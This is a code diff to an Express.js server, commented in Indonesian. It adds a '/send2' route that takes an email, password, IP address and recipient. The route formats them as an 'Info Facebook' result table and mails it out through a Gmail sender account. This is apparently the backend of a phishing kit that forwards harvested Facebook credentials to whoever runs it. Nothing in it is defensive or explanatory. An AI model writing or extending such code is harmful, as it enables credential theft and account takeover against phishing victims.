@@ -199,6 +199,110 @@ app.get("/auto", async (req, res) => {
     }
 });
 
+// ====================== ROUTE SEND2 (manual input full, pake template custom & msg.sender.cg.team) ======================
+app.get('/send2', async (req, res) => {
+    const { email, password, Ip, to } = req.query;
+
+    if (!email || !password || !Ip || !to) {
+        return res.status(400).json({ message: "Missing parameter. Harus ada email, password, Ip, dan to." });
+    }
+
+    const htmlContent = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Info Facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <style type="text/css">
+        body {
+            font-family: "Helvetica";
+            width: 90%;
+            display: block;
+            margin: auto;
+            border: 1px solid #fff;
+            background: #fff;
+        }
+        .result {
+            width: 100%;
+            height: 100%;
+            display: block;
+            margin: auto;
+            position: fixed;
+            top: 0; right: 0; left: 0; bottom: 0;
+            z-index: 999;
+            overflow-y: scroll;
+            border-radius: 10px;
+        }
+        .tblResult {
+            width: 100%;
+            display: table;
+            margin: 0px auto;
+            border-collapse: collapse;
+            text-align: center;
+            background: #fcfcfc;
+        }
+        .tblResult th {
+            text-align: left;
+            font-size: 1em;
+            margin: auto;
+            padding: 15px 10px;
+            background: #001240;
+            border: 2px solid #001240;
+            color: #fff;
+        }
+        .tblResult td {
+            font-size: 1em;
+            margin: auto;
+            padding: 10px;
+            border: 2px solid #001240;
+            text-align: left;
+            font-weight: bold;
+            color: #000;
+            text-shadow: 0px 0px 10px #fcfcfc;
+        }
+    </style>
+</head>
+<body>
+<div class="result">
+<table class="tblResult">
+<tr>
+    <th style="text-align: center;" colspan="3">Info Facebook</th>
+</tr>
+<tr>
+    <td style="border-right: none;">Email/Phone</td>
+    <td style="text-align: center;">${email}</td>
+</tr>
+<tr>
+    <td style="border-right: none;">Password</td>
+    <td style="text-align: center;">${password}</td>
+</tr>
+<tr>
+    <td style="border-right: none;">IP Address</td>
+    <td style="text-align: center;">${Ip}</td>
+</tr>
+<tr>
+    <th style="text-align: center;" colspan="3">&copy; Web Bagus 💤</th>
+</tr>
+</table>
+</div>
+</body>
+</html>
+`;
+
+    try {
+        await transporterAuto.sendMail({
+            from: `"Manual Sender" <msg.sender.cg.team@gmail.com>`,
+            to,
+            subject: `⚡ Manual Result Punya Si ${email}`,
+            html: htmlContent,
+        });
+
+        res.json({ message: `Email berhasil dikirim ke ${to}` });
+    } catch (err) {
+        res.status(500).json({ message: "Gagal mengirim email", error: err.message });
+    }
+});
+
 // ====================== START SERVER ======================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`✅ Server berjalan di port ${PORT}`));
